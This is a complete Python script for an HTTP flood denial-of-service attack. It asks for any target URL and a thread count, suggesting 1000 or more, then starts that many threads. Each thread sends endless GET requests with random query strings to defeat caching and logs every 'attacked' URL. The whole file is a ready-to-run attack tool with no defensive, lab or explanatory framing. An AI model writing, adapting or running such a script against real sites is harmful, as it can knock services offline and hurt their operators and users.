import threading
import requests
import random
import string
import time

def generate_random_data():
    """Generate random data to append to the URL to create unique requests."""
    letters = string.ascii_letters + string.digits
    return ''.join(random.choice(letters) for _ in range(10))

def attack(url):
    """Perform HTTP GET requests to flood the target URL."""
    while True:
        try:
            full_url = f"{url}?{generate_random_data()}"
            response = requests.get(full_url)
            print(f"Attacked {full_url} with response code: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"Error: {e}")

def get_input(prompt, type_func, default=None):
    """Get and validate user input."""
    while True:
        try:
            user_input = input(prompt)
            if user_input.strip() == "" and default is not None:
                return default
            return type_func(user_input)
        except ValueError:
            print(f"Invalid input. Please enter a valid {type_func.__name__}.")

def main():
    """Main function to set up and run the attack."""
    url = get_input("Enter the target URL (include http:// or https://): ", str)
    num_threads = get_input("Enter the number of threads (suggest 1000+): ", int, 1000)
    delay = get_input("Enter the delay between requests in seconds (suggest 0.1 or less): ", float, 0.1)

    # Create multiple threads to simulate a DDoS attack
    threads = []
    for i in range(num_threads):
        thread = threading.Thread(target=attack, args=(url,))
        thread.daemon = True
        threads.append(thread)
        time.sleep(delay)  # Delay between starting each thread

    # Start all threads
    for thread in threads:
        thread.start()

    # Keep the main thread alive
    for thread in threads:
        thread.join()

if __name__ == "__main__":
    main()
